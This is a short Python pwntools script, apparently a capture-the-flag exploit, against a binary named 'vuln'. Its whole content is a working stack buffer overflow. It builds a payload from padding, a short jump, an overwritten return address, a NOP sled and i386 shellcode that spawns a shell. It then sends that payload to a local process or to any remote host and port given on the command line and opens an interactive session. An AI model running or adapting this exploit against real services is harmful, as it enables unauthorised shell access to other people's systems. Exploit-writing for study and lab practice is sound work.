import pwn
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local","remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()
print(args.destination)


elf = pwn.ELF("./vuln")

#get memory adress of win function in the binary
# win_adress = elf.symbols["win"]

# g = pwn.gdb.attach(p) #link to gdb to debug locally


#sends and receives data just like sockets but locally
# print(p.recv().decode("utf-8"))

offset = 24
short_jump = b"\xeb\x08\x90\x90"
new_eip = pwn.p32(0x0805334b)
return_adress = pwn.p32(elf.symbols["main"])

payload = b"".join(
	[
		b"A"*offset,
		short_jump,
		new_eip,
		b"\x90"*16,
		pwn.asm(pwn.shellcraft.i386.linux.sh()),
		b"C"*500,
		
	]
	)
payload += b"\n"


if args.destination == "local":
	p = elf.process() #runs the program as a process to interact with it locally

elif args.destination == "remote":
	if not args.target or not args.port:
		pwn.error("provide -t for target host and -p for port")
		exit()
	p = pwn.remote(args.target, args.port)

# pwn.gdb.attach(p, """
# 	b *0x0805334b
# 	r < payload
# 	""")
p.send(payload)
p.interactive() #interact with the process locally
